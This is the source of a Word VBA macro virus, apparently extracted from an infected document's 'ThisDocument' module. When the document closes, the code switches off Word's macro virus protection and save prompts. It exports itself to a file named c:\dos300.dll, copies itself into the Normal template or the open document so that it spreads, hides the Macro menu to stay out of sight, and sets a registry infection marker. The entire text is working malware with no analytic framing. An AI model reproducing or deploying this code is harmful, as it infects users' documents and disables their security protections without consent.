   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = False
   Attribute VB_Exposed = False

   Private Sub Document_Close()
   On Error Resume Next
   With Options
   .VirusProtection = False
   .ConfirmConversions = False
   .SaveNormalPrompt = False
   End With
   If System.ProfileString("HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") <> "AntiCor" Then
   GoTo SaberI
   End If
   SaberI:
   ThisDocument.VBProject.VBComponents(1).Export ("c:\dos300.dll")
   If CommandBars("Tools").Controls("Macro").Visible = True Then
   Set this = ThisDocument.VBProject.VBComponents(1).CodeModule
   Set x = NormalTemplate.VBProject
   Set x2 = x.VBComponents(1).CodeModule
   End If
   Set y = ActiveDocument.VBProject
   Set y2 = y.VBComponents(1).CodeModule
   CommandBars("Tools").Controls("Macro").Visible = False
   Set alin = y2.CountOfLines
   Set nlin = x2.CountOfLines
   If nlin < this.CountOfLines Then
    x2.AddFromFile ("c:\dos300.dll")
    x2.deletelines 1, 4
   Else
   If alin < this.CountOfLines Then
   y2.AddFromFile ("c:\dos300.dll")
   y2.deletelines 1, 4
   End If
   End If
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") = "AntiCor"
   End Sub
